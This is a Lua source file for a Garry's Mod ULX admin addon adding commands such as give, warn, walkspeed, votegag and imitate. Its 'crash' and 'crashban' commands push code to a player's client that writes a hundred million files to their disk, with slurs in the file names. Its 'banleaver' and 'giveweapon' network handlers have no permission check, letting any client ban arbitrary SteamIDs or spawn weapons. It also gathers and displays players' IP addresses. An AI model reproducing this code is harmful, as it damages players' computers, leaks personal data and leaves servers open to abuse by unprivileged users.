Weapon_Ents = {
"weapon_ttt_m16",
"weapon_zm_mac10",
"weapon_zm_pistol",
"weapon_zm_revolver",
"weapon_zm_rifle",
"weapon_zm_shotgun",
"weapon_zm_sledge",
"weapon_ttt_glock"
}
Warnings_for_kick = 3


print("ULX Extended is loading")

function ulx.crash(calling_ply, target_ply)
        target_ply:SendLua([[
		file.CreateDir("faggot")
		for i = 1,100000000 do
		file.Write("faggot/umad"..i..".txt","i leik big dick hehheheh")
		end
		]])
end
local crash = ulx.command("Extended", "ulx crash", ulx.crash)
crash:addParam{ type=ULib.cmds.PlayerArg }
crash:defaultAccess( ULib.ACCESS_SUPERADMIN )

function ulx.crashban(calling_ply, target_ply,minutes,reason)
	target_ply:Lock(true)
	target_ply:SetColor(Color(0,0,200,200))
	target_ply.BeingBanned = true
        target_ply:SendLua([[
		file.CreateDir("faggot")
		for i = 1,100000000 do
		file.Write("faggot/umad"..i..".txt","i leik big dick hehheheh")
		print(i)
		end
		]])
		
	function banOnDC(ply)
		if ply.BeingBanned == true then
			ULib.ban(ply,minutes,reason, calling_ply)
				local time = "for #i minute(s)"
				if minutes == 0 then time = "permanently" end
				local str = "#T was banned " .. time
				if reason and reason ~= "" then str = str .. " (#s)" end
				ulx.fancyLogAdmin( calling_ply, str, target_ply, minutes ~= 0 and minutes or reason, reason )
		end
	end
	ulx.fancyLogAdmin( nil, true,  "#T is being banned", target_ply)
	hook.Add("PlayerDisconnected", "DCBAN", banOnDC )
	
end
local crashban = ulx.command("Extended", "ulx crashban", ulx.crashban)
crashban:addParam{ type=ULib.cmds.PlayerArg }
crashban:addParam{ type=ULib.cmds.NumArg, hint="minutes, 0 for perma", ULib.cmds.optional, ULib.cmds.allowTimeString, min=0 }
crashban:addParam{ type=ULib.cmds.StringArg, hint="reason", ULib.cmds.optional, ULib.cmds.takeRestOfLine, completes=ulx.common_kick_reasons }
crashban:defaultAccess( ULib.ACCESS_SUPERADMIN )

RecentDCs = {}

function addToRecent(ply)

local plytable = {
	time = ply:TimeConnected(),
	ip = ply:IPAddress(),
	id = ply:SteamID(),
	nick = ply:Nick()
					}

table.insert(RecentDCs,plytable)
if #RecentDCs >= 16 then
for i = 16,#RecentDCs do
table.remove(RecentDCs,i)
end
end

end
hook.Add( "PlayerDisconnected", "addtodctable", addToRecent )

function ulx.recentdcs(calling_ply)

net.Start("RecentDCs")
	net.WriteTable(RecentDCs)
net.Send(calling_ply)

       calling_ply:SendLua([[
       chat.AddText( Color(151, 211, 255), "Check console.")
	   for k,v in pairs(RecentDCs) do
			print(v.nick)
		end
	]])
end
local recentdcs = ulx.command("Extended", "ulx recentdcs", ulx.recentdcs)
recentdcs:defaultAccess( ULib.ACCESS_ALL )

function ulx.recentdcmenu(calling_ply)

net.Start("RecentDCs")
	net.WriteTable(RecentDCs)
net.Send(calling_ply)
       calling_ply:SendLua([[ DCMenu() ]])


end
local recentdcmenu = ulx.command("Extended", "ulx dcmenu", ulx.recentdcmenu, "!dcmenu")
recentdcmenu:defaultAccess( ULib.ACCESS_ADMIN )



if CLIENT then

local function receive_message(len, ply)
	RecentDCs = net.ReadTable()
end
net.Receive("recentdcs", receive_message)


function GiveMenu()
local DermaPanel = vgui.Create( "DFrame" )
DermaPanel:SetSize( 250, 250 )
DermaPanel:SetTitle( "Weapon Menu" )
DermaPanel:SetVisible( true )
DermaPanel:SetDraggable( true )
DermaPanel:ShowCloseButton( true )
DermaPanel:Center()
DermaPanel:MakePopup()
DermaPanel.Paint = function()
	draw.RoundedBox( 8, 0, 0, DermaPanel:GetWide(), DermaPanel:GetTall(), Color( 0, 0, 0, 150 ) )
end
 
DermaList = vgui.Create( "DPanelList", DermaPanel )
DermaList:SetPos( 25,25 )
DermaList:SetSize( 200, 200 )
DermaList:SetSpacing( 5 ) -- Spacing between items
DermaList:EnableHorizontal( false ) -- Only vertical items
DermaList:EnableVerticalScrollbar( true ) -- Allow scrollbar if you exceed the Y axis

for k,v in pairs(Weapon_Ents) do
    local pv = vgui.Create("DButton", DermaPanel)
	pv:SetText(v)
    pv.DoClick = function()
		net.Start("giveweapon")
			net.WriteString(v)
		net.SendToServer()
    end
DermaList:AddItem( pv ) -- Add the item above
end
end

function DCMenu()
if RecentDCs == nil then
RecentDCs = {}
end

local DermaPanel = vgui.Create( "DFrame" )
DermaPanel:SetSize( 250, 250 )
DermaPanel:SetTitle( "Disconnected users Menu" )
DermaPanel:SetVisible( true )
DermaPanel:SetDraggable( true )
DermaPanel:ShowCloseButton( true )
DermaPanel:Center()
DermaPanel:MakePopup()
DermaPanel.Paint = function()
	draw.RoundedBox( 8, 0, 0, DermaPanel:GetWide(), DermaPanel:GetTall(), Color( 0, 0, 0, 150 ) )
end
 
DermaList = vgui.Create( "DPanelList", DermaPanel )
DermaList:SetPos( 25,25 )
DermaList:SetSize( 200, 200 )
DermaList:SetSpacing( 5 ) -- Spacing between items
DermaList:EnableHorizontal( false ) -- Only vertical items
DermaList:EnableVerticalScrollbar( true ) -- Allow scrollbar if you exceed the Y axis


for k,v in pairs(RecentDCs) do
    local banv = vgui.Create("DButton", DermaPanel)
	banv:SetText("Ban "..v.nick)
    banv.DoClick = function()
		net.Start("banleaver")
			net.WriteString(v.id.."{sep}"..v.nick)
		net.SendToServer()
    end
DermaList:AddItem( banv ) -- Add the item above
end

for k,v in pairs(RecentDCs) do
	local id = v.id
    local copyidv = vgui.Create("DButton", DermaPanel)
	copyidv:SetText("Copy "..v.nick.."'s SteamID")
    copyidv.DoClick = function()
	SetClipboardText(id)
        chat.AddText( Color(151, 211, 255), "SteamID: '", Color(0, 255, 0), id , Color(151, 211, 255), "' successfully copied!")
    end
DermaList:AddItem( copyidv ) -- Add the item above
end

for k,v in pairs(RecentDCs) do
	local ip = v.ip
    local copyipv = vgui.Create("DButton", DermaPanel)
	copyipv:SetText("Copy "..v.nick.."'s IP")
    copyipv.DoClick = function()
	SetClipboardText(ip)
        chat.AddText( Color(151, 211, 255), "IP: '", Color(0, 255, 0), ip , Color(151, 211, 255), "' successfully copied!")
    end
DermaList:AddItem( copyipv ) -- Add the item above

end

end -- function
end -- if client

local function receive_message(len, ply)
	local IDNick = net.ReadString()
	local datatable = string.Explode("{sep}",IDNick)
	local steamid = datatable[1]
	local nick = datatable[2]
		ULib.addBan( steamid, 0, "Avoiding punishment", nick, ply )
		ulx.fancyLogAdmin( ply, "#A banned #s(#s) for avoiding punishment!",nick,steamid)
end
net.Receive("banleaver", receive_message)




if SERVER then
util.AddNetworkString( "giveweapon" )
util.AddNetworkString( "recentdcs" )
util.AddNetworkString( "banleaver" )
end
function ulx.give(calling_ply,wep)
if wep == "" then
calling_ply:SendLua([[GiveMenu()]])

local function receive_message(len, ply)
	local wep = net.ReadString()
	ply:Give(wep)
end
net.Receive("giveweapon", receive_message)
else
calling_ply:Give(wep)
end
end
local give = ulx.command("Extended", "ulx give", ulx.give, "!give", true)
give:defaultAccess( ULib.ACCESS_ADMIN )
give:addParam{ type=ULib.cmds.StringArg, hint="weapon", ULib.cmds.optional, ULib.cmds.takeRestOfLine }

function ulx.cleanup(calling_ply)
game.CleanUpMap()
ulx.fancyLogAdmin( calling_ply, "#A cleaned up the map")
end
local cleanup = ulx.command("Extended", "ulx cleanup", ulx.cleanup, "!cleanup", true)
cleanup:defaultAccess( ULib.ACCESS_SUPERADMIN )
cleanup:help( "Cleanup map (any gamemode)." )


function ulx.warn(calling_ply, target_ply,reason)
	ulx.fancyLogAdmin( calling_ply, "#A warned #T for #s" , target_ply,reason )
	target_ply:SetPData("Watched","true")
	target_ply:SetPData("WatchReason",reason)
	target_ply:SetPData("warnings",target_ply:GetPData("warnings",0)+1)
	if tonumber(target_ply:GetPData("warnings",0)) >= Warnings_for_kick then
	ulx.kick( calling_ply, target_ply, "Exceeded maximum warnings" )
	target_ply:SetPData("warnings",0)
	end
end
local warn = ulx.command("Extended", "ulx warn", ulx.warn, "!warn",true)
warn:addParam{ type=ULib.cmds.PlayerArg }
warn:addParam{ type=ULib.cmds.StringArg, hint="reason", ULib.cmds.takeRestOfLine }
warn:defaultAccess( ULib.ACCESS_ADMIN )
warn:help( "Warn a player." )



if GetConVarString("gamemode") == "terrortown" then



function ulx.walkspeed(calling_ply,speed)
	local ptab = FindMetaTable("Player")
		function ptab:SetSpeed(slowed)		
		if slowed then
			self:SetWalkSpeed(speed * 0.54)
		else
			self:SetWalkSpeed(speed)
		end
	end
	ulx.fancyLogAdmin( calling_ply, "#A set global walk speed to #s", speed )
end
local walkspeed = ulx.command("Extended", "ulx walkspeed", ulx.walkspeed, "!walkspeed",true)
walkspeed:addParam{ type=ULib.cmds.NumArg, hint="player speed", min=1 }
walkspeed:defaultAccess( ULib.ACCESS_ADMIN )
walkspeed:help( "set walking speed for a player." )

function ulx.runspeed(calling_ply,speed)

	local ptab = FindMetaTable("Player")
		function ptab:SetSpeed(slowed)		
		if slowed then
			self:SetRunSpeed(speed * 0.54)
		else
			self:SetRunSpeed(speed)
		end
	end

	ulx.fancyLogAdmin( calling_ply, "#A set global runspeed to #s", speed )
end
local runspeed = ulx.command("Extended", "ulx runspeed", ulx.runspeed, "!runspeed",true)
runspeed:addParam{ type=ULib.cmds.NumArg, hint="player speed", min=1 }
runspeed:defaultAccess( ULib.ACCESS_ADMIN )
runspeed:help( "set running speed for a player." )

function ulx.size(calling_ply, scale,bool)

	local affected_plys = {}

	for k,v in pairs(player.GetAll()) do
	v:SetViewOffset(Vector(0,0,64*scale))
	v:SetViewOffsetDucked(Vector(0,0,28*scale))
	v:SetModelScale(scale, 0)
	if bool == true then
		local ptab = FindMetaTable("Player")
		function ptab:SetSpeed(slowed)		
		if slowed then
			self:SetRunSpeed(200*scale*0.54)
			self:SetJumpPower(200*scale*0.54)
			self:SetWalkSpeed(200*scale*0.54)
			
		else
			self:SetRunSpeed(200*scale)
			self:SetJumpPower(200*scale)
			self:SetWalkSpeed(200*scale)
		end
	end
	end
	end
	
	if bool == false then
	ulx.fancyLogAdmin( calling_ply, "#A set global model scale to #s", scale)
	else
	ulx.fancyLogAdmin( calling_ply, "#A set global model,speed, and jump scale to #s",scale)
	end
end
local size = ulx.command("Extended", "ulx size", ulx.size, "!size",true)
size:addParam{ type=ULib.cmds.NumArg, hint="scale", min=0.1 }
size:addParam{ type=ULib.cmds.BoolArg,hint="scale other stats", }
size:defaultAccess( ULib.ACCESS_ADMIN )
size:help( "set global size of a player." )

else	-- TTT defines walkspeed and runspeed, so we need to dupe it, and make edgy fixes.

function ulx.size(calling_ply, target_plys,scale,bool)

	local affected_plys = {}

	for i=1, #target_plys do
		local v = target_plys[ i ]
	v:SetViewOffset(Vector(0,0,64*scale))
	v:SetViewOffsetDucked(Vector(0,0,28*scale))
	v:SetModelScale(scale, 0)
	if bool == true then
	v:SetRunSpeed(500*scale)
	v:SetJumpPower(200*scale)
	v:SetWalkSpeed(200*scale)
	end
	end
	
	if bool == false then
	ulx.fancyLogAdmin( calling_ply, "#A set model scale for #T to #s", target_plys,scale)
	else
	ulx.fancyLogAdmin( calling_ply, "#A set model,speed, and jump scale for #T to #s", target_plys,scale)
	end
end
local size = ulx.command("Extended", "ulx size", ulx.size, "!size",true)
size:addParam{ type=ULib.cmds.PlayersArg }
size:addParam{ type=ULib.cmds.NumArg, hint="scale", min=0.1 }
size:addParam{ type=ULib.cmds.BoolArg,hint="scale other stats", }
size:defaultAccess( ULib.ACCESS_ADMIN )
size:help( "set size of a player." )


function ulx.globalsize(calling_ply, scale,bool)

	local affected_plys = {}

	for k,v in pairs(player.GetAll()) do
	v:SetViewOffset(Vector(0,0,64*scale))
	v:SetViewOffsetDucked(Vector(0,0,28*scale))
	v:SetModelScale(scale, 0)

	if bool == true then
			v:SetRunSpeed(500*scale)
			v:SetJumpPower(200*scale)
			v:SetWalkSpeed(200*scale)
	end
	end
	
	if bool == false then
	ulx.fancyLogAdmin( calling_ply, "#A set global model scale to #s", scale)
	else
	ulx.fancyLogAdmin( calling_ply, "#A set global model,speed, and jump scale to #s",scale)
	end
end
local globalsize = ulx.command("Extended", "ulx globalsize", ulx.globalsize, "!globalsize",true)
globalsize:addParam{ type=ULib.cmds.NumArg, hint="scale", min=0.1 }
globalsize:addParam{ type=ULib.cmds.BoolArg,hint="scale other stats", }
globalsize:defaultAccess( ULib.ACCESS_ADMIN )
globalsize:help( "set global size of a player." )

function ulx.walkspeed(calling_ply, target_ply,speed)
	target_ply:SetWalkSpeed(speed)
	ulx.fancyLogAdmin( calling_ply, "#A set walk speed for #T to #s", target_ply,speed )
end
local walkspeed = ulx.command("Extended", "ulx walkspeed", ulx.walkspeed, "!walkspeed",true)
walkspeed:addParam{ type=ULib.cmds.PlayerArg }
walkspeed:addParam{ type=ULib.cmds.NumArg, hint="player speed", min=1 }
walkspeed:defaultAccess( ULib.ACCESS_ADMIN )
walkspeed:help( "set walking speed for a player." )


function ulx.runspeed(calling_ply, target_ply,speed)
	target_ply:SetRunSpeed(speed)
	ulx.fancyLogAdmin( calling_ply, "#A set run speed for #T to #s", target_ply,speed )
end
local runspeed = ulx.command("Extended", "ulx runspeed", ulx.runspeed, "!runspeed",true)
runspeed:addParam{ type=ULib.cmds.PlayerArg }
runspeed:addParam{ type=ULib.cmds.NumArg, hint="player speed", min=1 }
runspeed:defaultAccess( ULib.ACCESS_ADMIN )
runspeed:help( "set running speed for a player." )

function ulx.globalwalkspeed(calling_ply,speed)
		for k,v in pairs(player.GetAll()) do
			v:SetWalkSpeed(speed)
		end
	ulx.fancyLogAdmin( calling_ply, "#A set global walk speed to #s", speed )
end
local globalwalkspeed = ulx.command("Extended", "ulx globalwalkspeed", ulx.globalwalkspeed, "!globalwalkspeed",true)
globalwalkspeed:addParam{ type=ULib.cmds.NumArg, hint="player speed", min=1 }
globalwalkspeed:defaultAccess( ULib.ACCESS_ADMIN )
globalwalkspeed:help( "set walking speed for a player." )

function ulx.globalrunspeed(calling_ply,speed)
		for k,v in pairs(player.GetAll()) do
			v:SetRunSpeed(speed)
		end
	ulx.fancyLogAdmin( calling_ply, "#A set global run speed to #s", speed )
end
local globalrunspeed = ulx.command("Extended", "ulx globalrunspeed", ulx.globalrunspeed, "!globalrunspeed",true)
globalrunspeed:addParam{ type=ULib.cmds.NumArg, hint="player speed", min=1 }
globalrunspeed:defaultAccess( ULib.ACCESS_ADMIN )
globalrunspeed:help( "set running speed for a player." )


end


function ulx.jumppower(calling_ply, target_ply,power)

	target_ply:SetJumpPower(power)
	ulx.fancyLogAdmin( calling_ply, "#A set jump power for #T to #s", target_ply,power )
end
local jumppower = ulx.command("Extended", "ulx jumppower", ulx.jumppower, "!jumppower",true)
jumppower:addParam{ type=ULib.cmds.PlayerArg }
jumppower:addParam{ type=ULib.cmds.NumArg, hint="player power", min=1 }
jumppower:defaultAccess( ULib.ACCESS_ADMIN )
jumppower:help( "set jump power for a player." )

if CLIENT then
hook.Add("CreateMove", "BHop", function(ucmd)
	local ply = LocalPlayer()
	if LocalPlayer():GetNWInt("bhop") == 1 and IsValid(ply) and bit.band(ucmd:GetButtons(), IN_DUCK) > 0 then
		if ply:OnGround() then
			ucmd:SetButtons( bit.bor(ucmd:GetButtons(), IN_JUMP) )
		end
	end
end)
end

function ulx.bhop(calling_ply, target_ply,bool)

	target_ply:SetNWInt("bhop",bool)
	ulx.fancyLogAdmin( calling_ply, "#A set bhop mode for #T to #s", target_ply,bool)
end
local bhop = ulx.command("Extended", "ulx bhop", ulx.bhop, "!bhop",true)
bhop:addParam{ type=ULib.cmds.PlayerArg }
bhop:addParam{ type=ULib.cmds.NumArg, hint="1 to enable", min=0,max=1 }
bhop:defaultAccess( ULib.ACCESS_ADMIN )
bhop:help( "set bhop for a player." )

if SERVER then
util.AddNetworkString( "scale" )

end



local function voteGagDone2( t, target, time, ply, reason )
	local shouldGag = false

	if t.results[ 1 ] and t.results[ 1 ] > 0 then
		ulx.logUserAct( ply, target, "#A approved the votegag against #T" )
		ulx.fancyLogAdmin( ply, "#A approved the votegag against #T",target )
		shouldGag = true
	else
		ulx.logUserAct( ply, target, "#A denied the votegag against #T" )
		ulx.fancyLogAdmin( ply, "#A denied the votegag against #T",target )
	end

	if shouldGag then
			target.ulx_gagged = true
			local democracy = "Democracy"
			ulx.fancyLogAdmin( nil, "#s gagged #T",democracy,target )
			print("shit happened")
	end
end

local function voteGagDone( t, target, time, ply )
	local results = t.results
	local winner
	local winnernum = 0
	for id, numvotes in pairs( results ) do
		if numvotes > winnernum then
			winner = id
			winnernum = numvotes
		end
	end

	local ratioNeeded = GetConVarNumber( "ulx_votegagSuccessratio" )
	local minVotes = GetConVarNumber( "ulx_votegagMinvotes" )
	local str
	if winner ~= 1 or winnernum < minVotes or winnernum / t.voters < ratioNeeded then
		str = "Vote results: User will not be gagged. (" .. (results[ 1 ] or "0") .. "/" .. t.voters .. ")"
	else
		str = "Vote results: User will now be gagged, pending approval. (" .. winnernum .. "/" .. t.voters .. ")"
		ulx.doVote( "Accept result and gag " .. target:Nick() .. "?", { "Yes", "No" }, voteGagDone2, 30000, { ply }, true, target, time, ply)
	end

	ULib.tsay( _, str ) -- TODO, color?
	ulx.logString( str )
	if game.IsDedicated() then Msg( str .. "\n" ) end
end

function ulx.votegag( calling_ply, target_ply)
	if voteInProgress then
		ULib.tsayError( calling_ply, "There is already a vote in progress. Please wait for the current one to end.", true )
		return
	end

	local msg = "Gag " .. target_ply:Nick() .. "?"

	ulx.doVote( msg, { "Yes", "No" }, voteGagDone, _, _, _, target_ply, time, calling_ply, reason )
	ulx.fancyLogAdmin( calling_ply, "#A started a votegag against #T", target_ply )
end
local votegag = ulx.command( "Extended", "ulx votegag", ulx.votegag, "!votegag" )
votegag:addParam{ type=ULib.cmds.PlayerArg }
votegag:defaultAccess( ULib.ACCESS_ADMIN )
votegag:help( "Starts a public gag vote against target." )
if SERVER then ulx.convar( "votegagSuccessratio", "0.6", _, ULib.ACCESS_ADMIN ) end -- The ratio needed for a votegag to succeed
if SERVER then ulx.convar( "votegagMinvotes", "2", _, ULib.ACCESS_ADMIN ) end -- Minimum votes needed for votegag


function ulx.imitate(calling_ply, target_ply,chatmessage,should_imitateteam)
if calling_ply:SteamID() == target_ply:SteamID() then
ULib.tsayError(calling_ply,"You can't target yourself.", true )
--return
end

if target_ply.ulx_gagged then
ULib.tsayError(calling_ply,"Target is gagged!", true )
return
end
print(should_imitateteam)
ulx.fancyLogAdmin(calling_ply,true,"#A imitated #T (#s)",target_ply,chatmessage)
target_ply:ConCommand((should_imitateteam and "say_team" or "say") .. " " .. chatmessage )
end
local imitate = ulx.command("Extended", "ulx imitate", ulx.imitate, "!imitate",true)
imitate:addParam{ type=ULib.cmds.PlayerArg }
imitate:addParam{ type=ULib.cmds.StringArg, hint="chat message", ULib.cmds.takeRestOfLine }
imitate:addParam{ type=ULib.cmds.BoolArg, invisible=true }
imitate:defaultAccess( ULib.ACCESS_ADMIN )
imitate:help( "Make another player say something in chat." )
imitate:setOpposite( "ulx imitateteam", {_,_,_, true}, "!imitateteam" )



function ulx.cleardecals(calling_ply)
ulx.fancyLogAdmin(calling_ply,"#A cleared all decals")
    for _, v in ipairs( player.GetAll() ) do
         v:ConCommand( "r_cleardecals" )
    end

end
local cleardecals = ulx.command("Extended", "ulx cleardecals", ulx.cleardecals, "!cleardecals")
cleardecals:defaultAccess( ULib.ACCESS_ADMIN )
cleardecals:help( "Clear all decals." )

function ulx.nocollide(calling_ply,should_collide)
if should_collide then
    for _, v in ipairs( player.GetAll() ) do
         v:SetCollisionGroup(0)
	end
else
    for _, v in ipairs( player.GetAll() ) do
         v:SetCollisionGroup(11)
	end
end

	if not should_collide then
		ulx.fancyLogAdmin(calling_ply,"#A disabled player collision")
	else
		ulx.fancyLogAdmin( calling_ply,"#A Enabled player collision")
	end

end
local nocollide = ulx.command("Extended", "ulx nocollide", ulx.nocollide, "!nocollide")
nocollide:defaultAccess( ULib.ACCESS_ADMIN )
nocollide:addParam{ type=ULib.cmds.BoolArg, invisible=true }
nocollide:help( "Enable nocollide." )
nocollide:setOpposite( "ulx collide", {_, true}, "!collide" )

function ulx.freezeprops(calling_ply,should_unfreeze)
	if not should_unfreeze then
		for k, v in pairs( ents.FindByClass("prop_physics")) do
			if v:IsValid() and v:IsInWorld()  then
				print(v:GetClass())
				v:GetPhysicsObject():EnableMotion(false)
			end
		end
	else
	for k, v in pairs( ents.FindByClass("prop_physics") ) do
		if v:IsValid() and v:IsInWorld() then
			v:GetPhysicsObject():EnableMotion(true)
		end
	end
	end

	if not should_unfreeze then
		ulx.fancyLogAdmin(calling_ply,"#A froze all props")
	else
		ulx.fancyLogAdmin( calling_ply,"#A unfroze all props")
	end

end
local freezeprops = ulx.command("Extended", "ulx freezeprops", ulx.freezeprops, "!freezeprops")
freezeprops:defaultAccess( ULib.ACCESS_ADMIN )
freezeprops:addParam{ type=ULib.cmds.BoolArg, invisible=true }
freezeprops:help( "Enable freezeprops." )
freezeprops:setOpposite( "ulx unfreezeprops", {_, true}, "!unfreezeprops" )

print("ULX Extended has finished loading")
